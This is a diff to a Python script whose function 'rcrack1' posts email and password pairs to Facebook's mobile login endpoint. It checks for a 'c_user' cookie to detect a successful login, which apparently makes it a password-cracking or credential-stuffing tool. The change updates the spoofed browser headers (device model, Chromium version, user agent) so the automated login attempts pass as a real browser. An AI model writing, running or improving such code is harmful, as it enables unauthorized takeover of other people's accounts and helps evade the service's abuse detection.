@@ -237,19 +237,18 @@ def rcrack1(uid,pwx,tl):
             "email":uid,
             "pass":ps,
             "login":"Log In"}
-            header_freefb ={"authority": 'm.facebook.com',
-	    "method": 'GET', 
-            "scheme": 'https',
-              'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-    'accept-language': 'en-US,en;q=0.9',
+            header_freefb ={'authority': 'www.facebook.com',
+    "method": 'GET',
+    "scheme": 'https',
+    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+    'accept-language': 'en-GB,en;q=0.9,bn-BD;q=0.8,bn;q=0.7,en-AU;q=0.6,en-US;q=0.5',
     'cache-control': 'max-age=0',
-    'dpr': '3',
-    'referer': 'https://m.facebook.com/',
+    'dpr': '2.25',
     'sec-ch-prefers-color-scheme': 'dark',
-    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
-    'sec-ch-ua-full-version-list': '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.116"',
-    'sec-ch-ua-mobile': '?1',
-    'sec-ch-ua-model': '"Infinix X678B"',
+    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
+    'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.4"',
+    'sec-ch-ua-mobile': '?0',
+    'sec-ch-ua-model': '"RMX3286"',
     'sec-ch-ua-platform': '"Android"',
     'sec-ch-ua-platform-version': '"13.0.0"',
     'sec-fetch-dest': 'document',
@@ -257,9 +256,8 @@ def rcrack1(uid,pwx,tl):
     'sec-fetch-site': 'same-origin',
     'sec-fetch-user': '?1',
     'upgrade-insecure-requests': '1',
-    'user-agent': pro,
-    'viewport-width': '980',
-}		    
+    'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
+    'viewport-width': '980',}		    
             lo = session.post('https://m.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&refid=8',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
